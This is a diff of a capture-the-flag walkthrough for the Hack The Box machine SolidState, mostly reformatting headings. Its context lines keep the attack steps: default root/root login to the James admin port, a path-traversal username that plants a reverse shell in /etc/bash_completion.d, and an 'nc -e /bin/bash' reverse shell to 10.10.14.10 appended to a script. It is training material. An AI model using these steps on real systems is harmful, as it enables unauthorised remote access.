@@ -1,4 +1,5 @@
 # SolidState
+
 **Machine ip:** 10.10.10.51
 
 ## Enumeration
@@ -45,7 +46,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
 
 ## Gaining Access
 
-### Method 1:
+### Method 1
 + Connect to port 4555 with `root`-`root` using nc: `nc 10.10.10.51 4555`
 + When you first start the TCP connection with the server, it takes a moment before you're prompted to login. Be patient!
 + List commands: `HELP`
@@ -148,7 +149,7 @@ pass: P@55W0rd1!2@
 - [Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
 - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#get-bash-from-ssh
 
-### Method 2:
+### Method 2
 + Log back to james remote admin server: `nc 10.10.10.51 4555`
 + Create a user with the username `../../../../../../../../etc/bash_completion.d` and password `123`.
 + This creates a file in **/etc/bash_completion.d** that contains the reverse shell. So that next time any user logs in, get a shell as that user.
@@ -180,7 +181,7 @@ FROM: test
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1ab9e6be-224e-4740-ae13-3695b6317f04)
 
-### Method 3:
+### Method 3
 + [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8441d1ab-28a1-4abe-b16b-71a17f49b74a)
@@ -220,7 +221,7 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf72433f-2a2e-4170-a00d-6828eb6c7ba3)
 
 
-# References & Alternatives:
+# References & Alternatives
 + https://vvmlist.github.io/#solidstate
 + https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit
@@ -233,5 +234,5 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 + https://54m4ri74n.medium.com/solidstate-walkthrough-hackthebox-431b48a6d24a
 + https://sparshjazz.medium.com/hackthebox-solidstate-writeup-f148db31864f
 
-# More:
+# More
 + RSIP: https://cheatsheet.haax.fr/network/services-enumeration/4555_rsip/
